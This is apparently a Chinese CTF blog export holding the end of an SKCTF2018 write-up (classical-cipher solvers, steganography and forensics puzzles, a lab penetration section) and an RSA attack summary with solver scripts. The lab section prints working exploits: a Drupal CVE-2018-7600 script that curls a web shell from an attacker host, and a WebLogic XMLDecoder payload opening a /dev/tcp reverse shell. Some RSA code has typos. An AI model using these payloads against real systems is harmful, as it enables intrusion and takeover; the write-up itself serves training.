  # 读取文件
  input = open(&#39;in.txt&#39;)
  try:
    plain = input.read()
  finally:
    input.close()

  print(plain)

  file = open(&#39;key.txt&#39;)
  try:
    key = file.read()
  finally:
    file.close()
  # 去除空格
  # key=key.replace(&#39; &#39;,&#39;&#39;) 

  text = Remove(key)
  text = Ordertext(text)
  Matrix = CreatMatrix(text)
  print(Matrix)
  # print(Matrix[0])

  # 若明文字母数为奇数时，则在明文的末端添加(Z)作为填充；
  len = 0
  for i in plain:
    len = len + 1
  if len % 2 == 1:
    plain += &#39;z&#39;

  cipher = encode(Matrix,plain,len)
  print(cipher)


  #flag:SKCTF&#123;rhcwgodmdbordbbutcgbmasklzdx&#125;</code></pre>
<h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>相关知识：仿射加密<br>参考原理：百度百科-仿射加密<br>m = 11x + 23(mod 26)<br>求得11模26的逆为19，因此c = 19(m - 23)(mod 26)</p>
<pre><code class="python">c = &#39;fwpcpywpcphnxaoxlywpcphnxlhco&#39;

def getGcd(x,y):
  while True:
    divisor = x % y
    gcd = y
    x,y = y,divisor
    if divisor == 0:
      break
  return gcd

def setCoprime(a,n):
  for i in range(1,n):
    #print(getGcd(n,i))
    if(1 == getGcd(n,i)): 
      a.append(i)

def get_a(l,a,n):
  for i in l:
    if(1 == a * i % n):
      return i
  return 0

def decrypt(s,a,b,n):
  c = &#39;&#39;
  s.split()
  l = []
  setCoprime(l,n)
  #print(l)
  #print(get_a(l,a,n))
  for i in s:
    c += chr(((get_a(l,a,n) * ((ord(i)-97) - b)) % 26)+97)
  return c

print(decrypt(c,11,23,26))

#flag:SKCTF&#123;wherethereisaflagthereisagirl&#125;</code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Just-Listen"><a href="#Just-Listen" class="headerlink" title="Just Listen"></a>Just Listen</h2><p>解压压缩包得到图片和mp3。</p>
<p>password.jpg藏着密码，用stegsolve打开，切换通道，得到密码。</p>
<p><img src="/images/SKCTF2018/listen1.png"></p>
<p><code>key&#123;forensics_is_fun&#125;</code></p>
<p>Mp3stego工具可以将信息隐藏到MP3中，并需用密钥解密。</p>
<p>Mp3stego工具：<a href="http://www.petitcolas.net/steganography/mp3stego/">http://www.petitcolas.net/steganography/mp3stego/</a></p>
<p>直接用工具解密得到flag。</p>
<p><img src="/images/SKCTF2018/listen2.png"></p>
<h2 id="真香"><a href="#真香" class="headerlink" title="真香"></a>真香</h2><p>下载zhenxiang.gif，放到binwalk中分析，发现有zip文件。</p>
<p><img src="/images/SKCTF2018/xiang1.png"></p>
<p><code>-e</code>参数提取出来。</p>
<p><img src="/images/SKCTF2018/xiang2.png"></p>
<p>得到一个加密的压缩包，注释<code>blind_water_mark</code>是压缩包密码。</p>
<p>解压得到<code>or.png</code>和<code>xor.png</code>两张图片。</p>
<p>注释同时也是提示，两张图片用盲水印攻击即可getflag。</p>
<p>BlindWaterMark工具:<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p><img src="/images/SKCTF2018/xiang3.png"></p>
<p>flag:</p>
<p><img src="/images/SKCTF2018/xiangflag.png"></p>
<h2 id="找到了也打不开"><a href="#找到了也打不开" class="headerlink" title="找到了也打不开"></a>找到了也打不开</h2><hr>
<p>题目是一个pcap的数据包，打开后发现数据包里的数据有很多，但是http的只有一条，查看这条http数据包，发</p>
<p>现数据内容为一个.zip的压缩包，那思路就很简单了，把这个zip文件里的内容提取出来，保存为一个压缩包文件，</p>
<p>但是解压需要密码，没有任何提示的情况下爆破是不可能的，用winhex或者UE等软件查看下十六进制文件，发现</p>
<p>是zip的伪加密，修改下zip的加密标志即可打开压缩包得到Flag。</p>
<h2 id="I-wanna-get-the-flag"><a href="#I-wanna-get-the-flag" class="headerlink" title="I_wanna_get_the_flag"></a>I_wanna_get_the_flag</h2><p>GameMarker 8.0制作的I wanna 游戏。(原名：I wanna be the GGM)</p>
<p>描述通关之后有flag。</p>
<p>3种解题方法</p>
<h3 id="1-通关游戏"><a href="#1-通关游戏" class="headerlink" title="1-通关游戏"></a>1-通关游戏</h3><p>既然是通关之后，那么凭技术通关也是没问题的。</p>
<h3 id="2-修改save文件。"><a href="#2-修改save文件。" class="headerlink" title="2-修改save文件。"></a>2-修改save文件。</h3><p>通过存档，玩游戏搞清save文件的格式，用16进制编辑。<br><img src="/images/SKCTF2018/iwanna.png"></p>
<p>标出的两位就是关卡的标志，题目说有12关，那么，把<code>0112</code>修改为<code>011E</code>，再进入游戏就可以得到flag。</p>
<h3 id="3-反编译"><a href="#3-反编译" class="headerlink" title="3-反编译"></a>3-反编译</h3><p>下载GameMarker 8.0 Decompiler，将exe进行反编译。得到工程文件gmk，下载一个GameMarker 8.0版本即可读取到所有资源，找到通关后场景就可以得到flag。</p>
<h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>vmdk文件其实是物理硬盘的虚拟版，也存在着跟物理硬盘的分区和扇区中类似的填充区域。我们可以利用VMware直接映射虚拟磁盘。</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1vzza21uj20r40b20xy.jpg"></p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w09pixoj20pf0ctwgm.jpg"></p>
<p>磁盘空间内只有一个nothing.rar，解压后得到nothing.gif，为NTFS数据流隐写。<strong>所以压缩包需要使用WinRAR进行解压。</strong></p>
<p>用lads.exe递归查询可看到flag.gif</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1mxxr4j20oy09h0t5.jpg"></p>
<p>使用Ntfs Streams Editor提取</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1uxzrjj20vw0dl0ws.jpg"></p>
<p>对gif图分帧处理，得到最终flag。</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w2eagy8j21a90510sz.jpg"></p>
<p>详细解析及原理见</p>
<p><a href="0sec.com.cn/2018-05-12/">0sec.com.cn/2018-05-12/</a></p>
<h1 id="靶场渗透"><a href="#靶场渗透" class="headerlink" title="靶场渗透"></a>靶场渗透</h1><p>网上搜下drupal的的漏洞，找到poc</p>
<pre><code>#!/usr/bin/env python3
import sys
import requests

print (&#39;################################################################&#39;)
print (&#39;# Proof-Of-Concept for CVE-2018-7600&#39;)
print (&#39;# by Vitalii Rudnykh&#39;)
print (&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;)
print (&#39;# https://github.com/a2u/CVE-2018-7600&#39;)
print (&#39;################################################################&#39;)
print (&#39;Provided only for educational or information purposes\n&#39;)


# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
# 
# example:
# proxies = &#123;&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;&#125;
# verify = False
proxies = &#123;&#125;
verify = True

target = &#39;http://192.168.211.105/&#39;
url = target + &#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39; 
payload = &#123;&#39;form_id&#39;: &#39;user_register_form&#39;, &#39;_drupal_ajax&#39;: &#39;1&#39;, &#39;mail[#post_render][]&#39;: &#39;exec&#39;, &#39;mail[#type]&#39;: &#39;markup&#39;, &#39;mail[#markup]&#39;: &#39;curl http://192.168.211.127:2333/shell.php| tee shell.php&#39;&#125;

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + &#39;shell.php&#39;, verify=verify)
if check.status_code != 200:
  sys.exit(&quot;Not exploitable&quot;)
print (&#39;\nCheck: &#39;+target+&#39;hello.txt&#39;)</code></pre>
<p>本地起个环境，利用curl来getshell</p>
<p>拿到shell利用msf丢个马上去 </p>
<p><img src="/images/SKCTF2018/bachang1.png"></p>
<p>扫一波发现了<code>10.0.0.3</code>开着7001端口，weblogic</p>
<p>网上找下poc</p>
<pre><code>#encoding: utf-8
import requests
headers = &#123; &#39;Content-type&#39;: &#39;text/xml&#39; &#125;
data = &#39;&#39;&#39;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
  &lt;void index=&quot;0&quot;&gt;
&lt;string&gt;bash&lt;/string&gt;
  &lt;/void&gt;
  &lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
  &lt;/void&gt;
  &lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.211.149/12222 0&gt;&amp;amp;1&lt;/string&gt;
  &lt;/void&gt;
&lt;/array&gt;
  &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/java&gt;
  &lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
  &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;&#39;&#39;&#39;
def exp(ip):
    print(&quot;Test for &quot; + ip + &quot; .....&quot;)
    r = requests.post(url=ip,data=data,headers=headers)
    print(r.status_code)
    print(r.text)

if __name__ == &#39;__main__&#39;:
    ip = &quot;http://10.0.0.3:7001/wls-wsat/CoordinatorPortType11&quot;
    exp(ip)</code></pre>
<p>修改下proxychains.conf加上代理，本地监听一下拿到shell</p>
<p><img src="/images/SKCTF2018/bachang2.png"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA题型总结（2018-8-5更新）</title>
    <url>/2018/07/28/rsa-ti-xing-zong-jie/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>参数：</p>
<blockquote>
<ul>
<li>p 和 q ：大整数N的两个因子（factor）</li>
<li>N：大整数N，我们称之为模数（modulusz)</li>
<li>e 和 d：互为模反数的两个指数（exponent）</li>
<li>c 和 m：分别是密文和明文，这里一般指的是一个十进制的数</li>
</ul>
</blockquote>
<p>加解密公式：</p>
<blockquote>
<ol>
<li>对明文m进行加密：c = pow(m, e, N)，得到的c即为密文</li>
<li>对密文c进行解密，m = pow(c, d, N)，得到的m即为明文</li>
</ol>
</blockquote>
<blockquote>
<ul>
<li>（N，e）：公钥</li>
<li>（N，d）：私钥</li>
</ul>
</blockquote>
<p>数学关系：</p>
<blockquote>
<p>N = p * q     (p,q为两个大素数)</p>
<p>φ = (p−1) * (q−1)     即N的欧拉函数</p>
<p> e * d ≡ 1 (mod φ)        e (1&lt;e&lt;φ)，且e和φ互质 / e的模反数为d</p>
</blockquote>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="分解N："><a href="#分解N：" class="headerlink" title="分解N："></a>分解N：</h3><ul>
<li><a href="http://factordb.com/">factordb</a>(在线查询N因子的网站，存储了大量N分解的因子)</li>
<li><a href="https://github.com/DarkenCode/yafu">yafu</a></li>
</ul>
<h3 id="提取N-e-amp-amp-私钥解密"><a href="#提取N-e-amp-amp-私钥解密" class="headerlink" title="提取N, e &amp;&amp; 私钥解密"></a>提取N, e &amp;&amp; 私钥解密</h3><ul>
<li>给出公钥提前N,e：</li>
</ul>
<pre><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></pre>
<ul>
<li>使用私钥解密密文：</li>
</ul>
<pre><code>openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</code></pre>
<ul>
<li>从cer文件中导出pubkey.pem文件</li>
</ul>
<pre><code>openssl x509 -inform der -in SRL.cer -pubkey -noout &gt; rsa_public_key.pem</code></pre>
<h3 id="Tools系列"><a href="#Tools系列" class="headerlink" title="Tools系列"></a>Tools系列</h3><ul>
<li><a href="https://github.com/ohroot/rsatools">rsatools</a>(公钥提取n,e / 由p,q生成私钥)</li>
<li><a href="https://github.com/D001UM3/CTF-RSA-tool">CTF-RSA-tool</a>(功能丰富的工具集合)</li>
</ul>
<h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><h3 id="N过小时"><a href="#N过小时" class="headerlink" title="N过小时"></a>N过小时</h3><p><strong>条件：</strong>N过小时</p>
<p>可以直接爆破N的因子，但一般的N都是很大的。</p>
<pre><code class="python">N = 1211809

for i in range(2, N):
    if N % i == 0:
        print i</code></pre>
<h3 id="Wiener’s-attack"><a href="#Wiener’s-attack" class="headerlink" title="Wiener’s attack"></a>Wiener’s attack</h3><p><strong>条件：</strong>针对d较小的情况下，如果给出的e很大，那么d一般不大，可以使用该攻击。</p>
<p>d的大小范围：         $d&lt;\frac{1}{3}N^{\frac{1}{4}}$    </p>
<p><a href="https://github.com/pablocelayes/rsa-wiener-attack">攻击脚本</a></p>
<p>例子：（SCTF-《it may contain ‘flag’》）</p>
<pre><code>n=0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bf

e=0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939

c=0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3
Tell me the msg.</code></pre>
<p>e很大，所以d很小，可以使用Wiener’s attack来攻击得到d。</p>
<p>攻击得到d=731297.</p>
<pre><code class="python">&gt;&gt;&gt; test_hack_RSA(n,e)
Hacked!
731297
&gt;&gt;&gt; d = 731297
&gt;&gt;&gt; flag = pow(c,d,n)
&gt;&gt;&gt; print hex(flag)[2:-1].decode(&#39;hex&#39;)
flag1sH3r3_d_ist0sma1l</code></pre>
<h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p><strong>条件：</strong></p>
<p>用相同的N，不同的私钥（不同的e）加密同一明文m。</p>
<p><strong>原理：</strong></p>
<p>设两个用户的公钥分别为 $e_1$ 和 $e_2$，且两者互质。明文消息为 $m$，密文分别为：</p>
<p>$ c_1 = m^{e_1}\bmod N $</p>
<p>$c_2 = m^{e_2}\bmod N $</p>
<p>当攻击者截获 $c_1$ 和 $c_2$ 后，就可以恢复出明文。用扩展欧几里得算法求出 $re_1+se_2=1\bmod n$ 的两个整数 $r$ 和 $s$，由此可得：</p>
<p>$c_{1}^{r}c_{2}^{s} \equiv m^{re_1}m^{se_2}\bmod n\ \equiv m^{(re_1+se_2)} \bmod n\ \equiv m\bmod n$</p>
<pre><code class="python"># -*- coding:utf-8
from libnum import n2s, s2n
from gmpy2 import invert
n= raw_input( &quot;Input the n: &quot;)
e1 = raw_input( &quot; Input the e1:&quot;)
e1 = raw_input (&quot;Input the e2:&quot;)
def egcd(a, b) :
    if a == O:
        return (b , 0, 1)
    else:
        g,y,x=egcd(b%a,a)
        return (g, x - (b/1a)*y,y)
fo1 = open(&#39; flag.enc1&#39;,&#39;rb&#39; )
fo2 = open(&#39; flag.enc2&#39;, &#39;rb&#39;)
datafo1 = fo1.read( )
datafo2 = fo2.read( )
c1 = s2n(datafo1)
c2 = s2n(datafo2)
fo1.close()
fo2.close()
c2 = invert(c2, n)
S = egcd(e1, e2)
s1 = s[1]
s2 = s[2]
s2 = - s2
m = pow(c1, s1, n)*pow(c2, s2, n) % n
print n2s(m)</code></pre>
<blockquote>
<p><a href="http://www.bystudent.com/?p=236">RSA攻击之共模攻击[转]</a></p>
</blockquote>
<h3 id="低加密指数攻击（小e）"><a href="#低加密指数攻击（小e）" class="headerlink" title="低加密指数攻击（小e）"></a>低加密指数攻击（小e）</h3><h4 id="爆破E"><a href="#爆破E" class="headerlink" title="爆破E"></a>爆破E</h4><p><strong>条件：</strong>e很小时，如果m也不大，那么m的e次方仍小于N，这时模N等于原值即$c=m^e mod N=m^e$.</p>
<p>所以我们可以直接对c进行e次开放的到明文。</p>
<p>攻击时可以采取爆破的方式。判断条件：<code>m**e==c</code></p>
<p>例题：                         </p>
<pre><code class="python">import libnum
c=20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637

n=127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049

for e in range(2,10):
    m = libnum.nroot(c,e)
    if m**e==c:
      break 
print &quot;e:&quot;,e
print &quot;m:&quot;,m
flag = libnum.n2s(m)
print flag</code></pre>
<h4 id="2-知道n-e-c（小e）"><a href="#2-知道n-e-c（小e）" class="headerlink" title="2.知道n,e,c（小e）"></a>2.知道n,e,c（小e）</h4><p>因为$c=m^e(\bmod N)$,已知条件是n,c,e，所以$m=\sqrt<a href="c+i*n">3</a>$.爆破i知道得到一个合理的整数m。</p>
<p>例子：（从publickey得知n,e，enc得知c）</p>
<pre><code class="python">import gmpy2

c=116214698212458844423103857913441458442339925798599963213841797239355927303444100470558669928406921448510293928093943444789453829949079413240725018736039767923604391303528886458189412543467131343322985424830636686501183872258486468191992358327597581678299206152472529682824142608687221595323829204633224168225369759736250844323337223323791058404140581339609822071015073468035751326068998489516195665086364268852958930252474477661580751480498632203323212772718600

n=1953100985460341348696462250270875098931515807146586756296095446519328460202594322688077959911801412881736536007030245814199784734114468379391959242638228445246656155129859794350223734103552981321896683545886584718379382489138858499065228901412805708175575610007278296746952620830529848517741610397035368508736304074009571123132231492002047409382240786830369954266084929667038697671614351425836882238175963587766360974168461069129309445949172255481878016805287109

e = 3

for i in range(5):
    if gmpy2.iroot(c+i*n,3)[1] == True:        //是否成功开根
        m = gmpy2.iroot(c+i*n,3)[0]
        break
print i
print m</code></pre>
<h3 id="d泄露攻击"><a href="#d泄露攻击" class="headerlink" title="d泄露攻击"></a>d泄露攻击</h3><p>d泄漏后如果消息还是使用该密钥对加密的话我们可以直接解密消息，如果d泄漏后更换了一组由新的e2组成的密钥，满足该攻击条件。假设原来的d我们已经知道（d1），N，e1我们可以通过openssl或<a href="https://github.com/D001UM3/CTF-RSA-tool">RSA-Tools</a>查看公钥得到，由N，d1，e1我们可以计算出p，q，有了p，q和e2可以计算出d2.就可以解密啦。</p>
<p><strong>例题</strong>：<a href="https://github.com/nguyenqh/hitb-xctf-2017/tree/master/HackInTheCardII">2017 HITB - hack in the card II</a></p>
<blockquote>
<p>The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -&gt; publickey.pem). However it seems that they missed something……<br>Can you decrypt the following hex-encoded ciphertext this time?</p>
<pre><code>016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977</code></pre>
</blockquote>
<p> 使用 <code>openssl</code> 或者<a href="https://github.com/D001UM3/CTF-RSA-tool">RSA-Tools</a>查看 <code>publickey.pem</code> 的公钥，发现它的 N 与上一道题的 N 相同，并且上题的 N，e，d 已知。由此可直接使用<a href="https://github.com/ius/rsatool">rsatool.py</a>得到 p，q，并通过本题的 e 计算出 d 得到明文。</p>
<pre><code class="python">#!/usr/bin/env python2    #由n,d,e求解p,q
import fractions, random

def factor_modulus(n, d, e):
    t = (e * d - 1)
    s = 0
    while True:
        quotient, remainder = divmod(t, 2)
        if remainder != 0:
            break
        s += 1
        t = quotient
    found = False
    while not found:
        i = 1
        a = random.randint(1,n-1)
        while i &lt;= s and not found:
            c1 = pow(a, pow(2, i-1, n) * t, n)
            c2 = pow(a, pow(2, i, n) * t, n)
            found = c1 != 1 and c1 != (-1 % n) and c2 == 1
            i += 1
    p = fractions.gcd(c1-1, n)
    q = n // p
    return p, q


if __name__ == &#39;__main__&#39;:
    n=input(&quot;n:&quot;)
    d=input(&quot;d:&quot;)
    e=input(&quot;e:&quot;)
    p,q = factor_modulus(n,d,e)
    print p,q</code></pre>
<h3 id="暴力分解-N"><a href="#暴力分解-N" class="headerlink" title="暴力分解 N"></a>暴力分解 N</h3><p>在 N 的比特位数小于 512 的时候，可以采用大整数分解的策略获取 p 和 q。</p>
<p>工具：<a href="http://factordb.com/">factordb</a>    <a href="https://github.com/DarkenCode/yafu">yafu</a></p>
<p><strong>例题</strong>：（JarvisOJ - Medium RSA）</p>
<blockquote>
<p>已知一段 RSA 加密的信息为：0xdc2eeeb2782c 且已知加密所用的公钥： N=322831561921859 e = 23 请解密出明文，提交时请将数字转化为 ascii 码提交 比如你解出的明文是 0x6162，那么请提交字符串 ab 提交格式：<code>PCTF&#123;明文字符串&#125;</code></p>
</blockquote>
<p>直接使用 factordb 进行分解,得到：322831561921859=13574881×23781539；p，q，e有了，可以求d进行解密了。</p>
<pre><code class="python">import gmpy2
p = 13574881
q = 23781539
n = p * q
e = 23
c = 0xdc2eeeb2782c
phin = (p - 1) * (q - 1)
d = gmpy2.invert(e, phin)
p = gmpy2.powmod(c, d, n)
tmp = hex(p)
print tmp, tmp[2:].decode(&#39;hex&#39;)</code></pre>
<h3 id="p-q-很大时"><a href="#p-q-很大时" class="headerlink" title="|p-q| 很大时"></a>|p-q| 很大时</h3><p>|p-q| 很大，那么p或q一定较小，假设q较小。我们可以穷举q来进行爆破。</p>
<h3 id="p-q-较小时"><a href="#p-q-较小时" class="headerlink" title="|p-q| 较小时"></a>|p-q| 较小时</h3><p>|p-q| 较小说明p和q比较接近，使用费马分解。</p>
<p>原理：</p>
<p><img src="https://raw.githubusercontent.com/LANVNAL/LANVNAL.github.io/master/images/RSA/fermat.png" alt="format"></p>
<pre><code class="python">def fermat(n):
    a = isqrt(n)
    b2 = a * a - n
    b = isqrt(n)
    count = 0
    while b * b != b2:
        a = a + 1
        b2 = a * a - n
        b = isqrt(b2)
        count += 1
    p = a + b
    q = a - b
    assert n == p * q
    return p, q</code></pre>
<h3 id="Rabin-算法"><a href="#Rabin-算法" class="headerlink" title="Rabin 算法"></a>Rabin 算法</h3><p>Rabin算法的特征在于<strong>e=2</strong>，如果一个题目的e=2时，我们可以考虑它是采用的rabin算法</p>
<p><strong>攻击原理</strong></p>
<p>密文：</p>
<p>$c=m^2,mod,n$</p>
<p>解密：</p>
<ul>
<li><p>计算出 $m_p$ 和 $m_q$：</p>
<p>$m_p=\sqrt{c},mod,p$</p>
<p>$m_q=\sqrt{c},mod,q$</p>
</li>
<li><p>用扩展欧几里得计算出 $y_p$ 和 $y_q$：</p>
<p>$y_p⋅p+y_q⋅q=1$</p>
</li>
<li><p>解出四个明文：</p>
<p>$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p),mod,n$</p>
<p>$b=n−a$</p>
<p>$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p),mod,n$</p>
<p>$d=n−c$</p>
</li>
</ul>
<p>注意：如果 $p≡q≡3,(mod,4)$，则</p>
<p>$m_p=c^{\frac{1}{4}(p+1)}modp$</p>
<p>$m_q=c^{\frac{1}{4}(q+1)},mod,q$</p>
<p>而一般情况下，$p≡q≡3,(mod,4)$ 是满足的，对于不满足的情况下，请参考相应的算法解决。</p>
<p><strong>例题</strong>（<a href="https://dn.jarvisoj.com/challengefiles/hardRSA.rar.b498edae4e73af8eb4567fb18117de46">hard RSA – jarvis oj</a>）</p>
<pre><code class="shell">~openssl rsa -pubin -in pubkey.pem -text -modulus
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 2 (0x2)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
writing RSA key
-----BEGIN PUBLIC KEY-----
MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
yigb/+l/vjDdAgEC
-----END PUBLIC KEY-----</code></pre>
<p>发现e为2，结合题目描述，应为rabin算法。</p>
<p>在线分解n得到p,q：</p>
<pre><code>p=275127860351348928173285174381581152299
q=319576316814478949870590164193048041239</code></pre>
<p>解题代码：(来自ctf-wiki)</p>
<pre><code class="python">#!/usr/bin/python
# coding=utf-8
import gmpy2
import string
from Crypto.PublicKey import RSA
import libnum

# 读取公钥参数
with open(&#39;pubkey.pem&#39;, &#39;r&#39;) as f:
    key = RSA.importKey(f)
    N = key.n
    e = key.e
with open(&#39;flag.enc&#39;, &#39;r&#39;) as f:
    cipher = f.read().encode(&#39;hex&#39;)
    cipher = string.atoi(cipher, base=16)
    # print cipher
print &quot;please input p&quot;
p = int(raw_input(), 10)
print &#39;please input q&#39;
q = int(raw_input(), 10)
# 计算yp和yq
inv_p = gmpy2.invert(p, q)
inv_q = gmpy2.invert(q, p)

# 计算mp和mq
mp = pow(cipher, (p + 1) / 4, p)
mq = pow(cipher, (q + 1) / 4, q)

# 计算a,b,c,d
a = (inv_p * p * mq + inv_q * q * mp) % N
b = N - int(a)
c = (inv_p * p * mq - inv_q * q * mp) % N
d = N - int(c)

for i in (a, b, c, d):
    print libnum.n2s(i)</code></pre>
<h3 id="Basic-Broadcast-Attack（低加密指数广播攻击）"><a href="#Basic-Broadcast-Attack（低加密指数广播攻击）" class="headerlink" title="Basic Broadcast Attack（低加密指数广播攻击）"></a>Basic Broadcast Attack（低加密指数广播攻击）</h3><p><strong>条件：</strong>如果一个用户使用同一个加密指数 e 加密了同一个消息，并发送给了其他 e 个用户。（相同的e，不同的N，同一明文）</p>
<p><strong>原理：</strong></p>
<p>m，e相同，不同的是c和n，所以：</p>
<p>$c_1 \equiv m^e \mod n_1$     =&gt;     $ m^e\equiv c_1 \mod n_1$</p>
<p>$c_2 \equiv m^e \mod n_2$    =&gt;     $ m^e\equiv c_2 \mod n_1$</p>
<p>$c_3 \equiv m^e \mod n_3$     =&gt;     $ m^e\equiv c_3 \mod n_1$</p>
<p>… </p>
<p>$c_n \equiv m^e \mod n_n$    =&gt;     $ m^e\equiv c_3 \mod n_1$</p>
<p>由中国剩余定理可得：</p>
<p> $m^e \equiv C \mod n_1n_2n_3\cdot\cdot\cdot n_n$</p>
<p>因为 $n_1n_2n_3\cdot\cdot\cdot n_n$ 比C大所以     $m^e \equiv C$</p>
<p>$C=c_1\cdot M_1\cdot t_1+ c_2\cdot M_2\cdot t_2 + … +c_n\cdot M_n\cdot t_n$    </p>
<p>$M_1 = n_2 \cdot n_3 \cdots \cdot n_n$    </p>
<p>$t_1 = M_1 \mod n_1$</p>
<p>所以m直接对C开e次方根就好。</p>
<blockquote>
<p><a href="https://www.wikiwand.com/zh-hans/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86">中国剩余定理-维基百科</a></p>
</blockquote>
<p><strong>例题：</strong>（HCTF GAME 进击的 Crypto [5]）</p>
<p>题目描述：</p>
<pre><code>n is
e is 10
c is

为了省地方省略了很多对这样的n,e,c值，下面代码中有全部n,e,c</code></pre>
<p>题解：</p>
<pre><code class="python">import gmpy

def my_parse_number(number):
    string = &quot;%x&quot; % number
    erg = []
    while string != &#39;&#39;:
        erg = erg + [chr(int(string[:2], 16))]
        string = string[2:]
    return &#39;&#39;.join(erg)

def e_gcd(a, b):
    x,y = 0, 1
    lastx, lasty = 1, 0
    while b:
        a, (q, b) = b, divmod(a,b)
        x, lastx = lastx-q*x, x
        y, lasty = lasty-q*y, y
    return (lastx, lasty, a)

def chinese_remainder_theorem(items):
  N = 1
  for a, n in items:
    N *= n

  result = 0
  for a, n in items:
    m = N/n
    r, s, d = e_gcd(n, m)
    if d != 1:
      raise &quot;Input not pairwise co-prime&quot;
    result += a*s*m

  return result % N, N

e=10

